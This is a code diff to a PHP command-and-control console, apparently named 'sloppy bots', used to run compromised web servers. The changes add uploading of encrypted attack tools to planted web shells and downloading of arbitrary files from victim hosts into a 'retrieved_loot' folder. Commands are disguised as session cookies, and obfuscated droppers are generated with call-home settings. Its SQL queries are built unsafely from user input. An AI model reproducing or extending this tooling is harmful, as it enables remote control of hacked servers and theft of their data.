@@ -40,17 +40,17 @@ if (empty(config['password'])) {
 }
 try {
     define("CHH", curl_init());
-    if (is_null(config['proxy'])) {
+    if (empty(config['proxy'])) {
         echo "Not setting proxy information";
         curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
     } else {
         curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']);
         curl_setopt(CHH, CURLOPT_PROXY, config["proxy"]);
     }
-    if (config['verify_ssl'] === "no"){
+    if (config['verify_ssl'] === "no") {
         curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
         curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
-    }else{
+    } else {
         curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 1);
         curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 1);
     }
@@ -125,7 +125,8 @@ function menu()
         (U)pdates  -> not implemented yet.                                                                 
         (A)dd new host                                                              
         (CH)eck if hosts are still pwned
-        (AT) Add tool                                            
+        (AT) Add tool
+        (UP)load tool to bot                                            
         (M)ain menu                                                                 
         (Q)uit                                                                      
 _MENU;
@@ -133,7 +134,53 @@ _MENU;
 
 }
 
-function b64($what, $how, $whereWeGo){
+function b64(array $what, $how, array $whereWeGo)
+{
+    curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
+    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
+    curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt(CHH, CURLOPT_POST, true);
+    $our_nonce = random_bytes(24);
+    $secure_Key = random_bytes(32);
+    $additionalData = random_bytes(16);
+    if ($how === "u") {
+        curl_setopt(CHH, CURLOPT_URL, $whereWeGo['Rhost'].$whereWeGo['uri']);
+        if ($what['Target'] === $whereWeGo["Os_Flavor"] || $what['Target'] === "universal"){
+            echo "\nTarget and victim OS match, should be good to go\n";
+        }elseif ($what['Target'] === "unk"){
+            echo "\nTarget of our tool is UNK, I hope you did your research on the target before selecting this.\n";
+        }
+        if (is_file($what['Base64_Encoded_Tool'])){
+            $what["read"] = file_get_contents($what['Base64_Encoded_Tool']);
+            $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
+        }else{
+            $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
+        }
+        $needed_values = base64_encode($tool);
+        $basedHashUpload = base64_encode($additionalData.".".$our_nonce.".".$secure_Key.".".$needed_values);
+        curl_setopt(CHH, CURLOPT_COOKIE, "cb64=U.".hash("sha512", $basedHashUpload, $binary=false)."; jsessionid=". $basedHashUpload);
+    }elseif ($how === "D"){
+        awesomeMenu();
+        $result = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", trim(readline("Which host?(by ID)->"))));
+        $wheretoGo = pg_fetch_row($result);
+        $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
+        $baseHashedDownload = base64_encode($additionalData.".".$our_nonce.".".$secure_Key.".".$tool);
+        curl_setopt(CHH, CURLOPT_URL, $wheretoGo[0].$wheretoGo[1]);
+        curl_setopt(CHH, CURLOPT_COOKIE, "cb64=D.".hash("sha512", $baseHashedDownload, $binary=false)."; jsessionid=". $baseHashedDownload);
+    }
+    $dx = curl_exec(CHH);
+    if (!curl_errno(CHH)) {
+        switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+            case 200:
+                logo('co', clears, false, '', '');
+                file_put_contents("includes/db/retrieved_loot/".curl_getinfo(CHH, CURLINFO_PRIMARY_IP), $dx);
+                echo $dx."\n";
+                break;
+            default:
+                logo('b64', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", '');
+        }
+
+    }
 
 }
 
@@ -144,7 +191,7 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
     if ($action === "add") {
         if (!empty($pathToFile) && is_file($pathToFile) && !empty($toolName)) {
             $file_parts = pathinfo($pathToFile);
-            switch ($file_parts['extension']){
+            switch ($file_parts['extension']) {
                 case "sh":
                     echo "Shell script detected.\n";
                     $toolTarget = 'lin';
@@ -197,25 +244,44 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                     break;
             }
             if ($encrypted === true) {
+                $algos = array(
+                    "chacha" => "chacha20-poly1305",
+                    "xchacha" => "xchacha20-poly1305",
+                    "aes-gcm" => "aes-265-gcm",
+                    "aes-ctr" => "aes-256-ctr"
+                );
                 $algo = "aes-256-gcm";
                 $passphrase = openssl_random_pseudo_bytes(32);
                 $passphraseHmacTagValue = openssl_random_pseudo_bytes(128);
+                $Oaad=hash_hmac('sha256', $passphraseHmacTagValue, $binary=true);
                 $IV = openssl_random_pseudo_bytes((int)openssl_cipher_iv_length($algo));
-                $crypted = openssl_encrypt(file_get_contents($pathToFile), $algo, $passphrase, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $IV, $passphraseHmacTagValue, strlen($passphraseHmacTagValue));
-                $t = hash_hmac("sha512", $crypted, $binary = true);
-                if (empty($toolTarget)){
+                if (strlen(file_get_contents($pathToFile)) > 8191){
+                    echo "Storing as an encoded file on disk. The tool size exceeds the maximum size in a postgresql cell.\n";
+                    $ciphered = 'includes/droppers/large_tools/' . $toolName . ".b64";
+                    if (!is_file('includes/droppers/large_tools/'.$toolName.".b64")) {
+                        $crypted = openssl_encrypt(file_get_contents($pathToFile), $algo, $passphrase, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $IV, $passphraseHmacTagValue, $tag_length=16, $aad=$Oaad);
+                        file_put_contents('includes/droppers/large_tools/' . $toolName . ".b64", base64_encode($crypted));
+                    }else{
+                        echo "\n!!! You have already added this tool !!!\n";
+                        return $ciphered;
+                    }
+                }else{
+                    $crypted = openssl_encrypt(file_get_contents($pathToFile), $algo, $passphrase, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $IV, $passphraseHmacTagValue, strlen($passphraseHmacTagValue));
+                    $ciphered =  base64_encode($crypted);
+                }
+                if (empty($toolTarget)) {
                     $toolTarget = "unk";
                     $language = "unk";
                 }
                 $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, encrypted) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
                     $toolName,
                     $toolTarget,
-                    base64_encode($crypted),
+                    $ciphered,
                     base64_encode($passphrase),
                     base64_encode($passphraseHmacTagValue),
                     base64_encode($IV),
-                    base64_encode($algo),
-                    $t,
+                    $algo,
+                    hash_hmac("sha512", $crypted, $binary = true),
                     $language,
                     true
                 );
@@ -225,34 +291,54 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                     $toolTarget,
                     base64_encode(file_get_contents($pathToFile)),
                     $language,
-                    hash_hmac("sha512", base64_encode(file_get_contents($pathToFile)), $binary=true)
+                    hash_hmac("sha512", file_get_contents($pathToFile), $binary = true)
                 );
             }
             pg_exec($c, $SQL_STMT);
         }
     } elseif ($action === "grab") {
         $tgrab = pg_exec($c, "SELECT * FROM sloppy_bots_tools");
-        echo str_repeat("+", 35) . "[ OUR TOOLSETS ]" . str_repeat("+", 39) . "\n\n";
-        foreach (pg_fetch_all($tgrab) as $ti => $tool){
-            if ($tool['encrypted'] == "t"){
+        echo "\n";
+        echo str_repeat("<", 35) . "[ OUR TOOLSETS ]" . str_repeat(">", 39) . "\n\n";
+        foreach (pg_fetch_all($tgrab) as $ti => $tool) {
+            if ($tool['encrypted'] == "t") {
                 $isEncrypted = "true";
-            }else{
+            } else {
                 $isEncrypted = "false";
             }
-            print(sprintf("ID -> [ ". $tool['id'] ." ] Tool Name-> [ ". $tool['tool_name'] ." ] Target OS -> [ ". $tool['target']. " ] Lang -> [ " . $tool['lang']." ] Encrypted -> [ ". $isEncrypted." ]\n"));
+            print(sprintf("ID -> [ " . $tool['id'] . " ] Tool Name-> [ " . $tool['tool_name'] . " ] Target OS -> [ " . $tool['target'] . " ] Lang -> [ " . $tool['lang'] . " ] Encrypted -> [ " . $isEncrypted . " ]\n"));
         }
-        echo "\n\n" . str_repeat("+", 35) . "[ END OUR TOOLSETS ]" . str_repeat("+", 35) . "\n\n";
-        $SQL_GRAB = sprintf("SELECT base64_encoded_tool,keys,tags,iv,cipher,hmac_hash,encrypted FROM sloppy_bots_tools WHERE id = '%s'", trim(readline('Which tool shall we use?(by ID)')));
+        echo "\n\n" . str_repeat("<", 35) . "[ END OUR TOOLSETS ]" . str_repeat(">", 35) . "\n\n";
+        $SQL_GRAB = sprintf("SELECT base64_encoded_tool,keys,tags,iv,cipher,hmac_hash,encrypted,target,aad FROM sloppy_bots_tools WHERE id = '%s'", trim(readline('Which tool shall we use?(by ID)-> ')));
         try {
             $selected_tool = pg_fetch_row(pg_exec($c, $SQL_GRAB));
-        }catch (Exception $toolE){
-            echo $toolE->getMessage()."\n";
-            echo $toolE->getTraceAsString()."\n";
-            echo $toolE->getLine()."\n";
+            $attack = array([
+                "Base64_Encoded_Tool" => $selected_tool[0],
+                "Key" => $selected_tool[1],
+                "Tag" => $selected_tool[2],
+                "IV" => $selected_tool[3],
+                "Cipher" => $selected_tool[4],
+                "Hash" => $selected_tool[5],
+                "Encrypted" => $selected_tool[6],
+                "Target" => $selected_tool[7],
+                "aad" => $selected_tool[8]
+            ],
+            );
+        } catch (Exception $toolE) {
+            echo $toolE->getMessage() . "\n";
+            echo $toolE->getTraceAsString() . "\n";
+            echo $toolE->getLine() . "\n";
             return 0;
         }
         awesomeMenu();
-        b64($selected_tool, 'u', trim(readline("Which host shall we send this tool to?->")));
+        $HOST_GRAB = sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = %d", trim(readline("Which host shall we send this tool to?->")));
+        $X = pg_fetch_row(pg_exec($c, $HOST_GRAB));
+        array_push($attack, [
+            "Rhost" => $X[0],
+            "uri" => $X[1],
+            "Os_Flavor" => $X[2]
+        ]);
+        b64($attack[0], 'u', $attack[1]);
     }
 }
 
@@ -288,8 +374,6 @@ function sys($host)
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt(CHH, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt(CHH, CURLOPT_SSL_VERIFYPEER, 0);
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
@@ -386,9 +470,7 @@ function co($command, $host, bool $encrypt)
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         curl_setopt(CHH, CURLOPT_POST, true);
-        //this is the default value the shell will be looking for, change it make it unique.
-        // and for those of you who read the source before you run. Howd ya get so smort.
-        curl_setopt(CHH, CURLOPT_COOKIE, "cx={$space_Safe_coms}");
+        curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$space_Safe_coms}");
         curl_setopt(CHH, CURLOPT_POSTFIELDS, "cr={$cr}");
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)) {
@@ -474,7 +556,7 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
                     }
                     print("Generated dropper will be: {$ob}\n");
                     $rtValues = $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, $duration, $slop);
-                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, xorkey) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')", $rtValues['Output File'], $depth,$obfsucate, $duration, $rtValues['Key'].".".$rtValues['IV'].".".$rtValues['tag'], $rtValues['XOR Key']));
+                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, xorkey) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')", $rtValues['Output File'], $depth, $obfsucate, $duration, $rtValues['Key'] . "." . $rtValues['IV'] . "." . $rtValues['tag'], $rtValues['XOR Key']));
                     $inDB->countUsedDomains($callHome);
                     system("ls -lah includes/droppers/dynamic/obfuscated");
                     break;
@@ -544,7 +626,6 @@ function awesomeMenu()
             $use['uri'],
             $use['os_flavor'],
             $use['check_in']
-
         ));
     }
     pg_free_result($count);
@@ -675,6 +756,9 @@ while ($run) {
     $lc = $pw;
     logo($lc, clears, "", "", '');
     switch (strtolower($pw)) {
+        case "up":
+            b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", array());
+            break;
         case "cr":
             system(clears);
             echo("Where are we calling home to? (hostname/ip)->");
@@ -808,8 +892,8 @@ while ($run) {
                 }
                 $name = trim(readline("Is there a name for it already, or what do you call it.? ->"));
                 sloppyTools($add, $ourTool, $name, $encrypt);
-            }else{
-                sloppyTools($add, '','','');
+            } else {
+                sloppyTools($add, '', '', '');
             }
             break;
         default:
